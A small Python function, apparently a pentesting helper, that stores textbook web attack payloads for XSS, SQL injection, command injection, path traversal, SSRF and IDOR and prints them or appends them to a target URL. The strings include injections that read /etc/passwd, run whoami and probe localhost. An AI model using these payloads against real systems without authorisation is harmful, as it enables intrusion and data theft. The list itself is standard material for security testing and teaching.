def generate_payload(vuln_type, target=None):
    payloads = {
        "xss": [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "';alert(String.fromCharCode(88,83,83))//"
        ],
        "sqli": [
            "' OR 1=1--",
            "' UNION SELECT NULL, version()--",
            "' AND sleep(5)--"
        ],
        "cmd": [
            ";cat /etc/passwd",
            "&& whoami",
            "| ls -la"
        ],
        "lfi": [
            "../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "/proc/self/environ"
        ],
        "ssrf": [
            "http://127.0.0.1:80",
            "http://localhost/admin",
            "file:///etc/passwd"
        ],
        "idor": [
            "user_id=1", "user_id=2", "user_id=3"
        ]
    }

    selected = payloads.get(vuln_type.lower(), [])
    print(f"[*] Payloadi za: {vuln_type.upper()}")

    for p in selected:
        if target:
            print(f"{target}?param={p}")
        else:
            print(p)
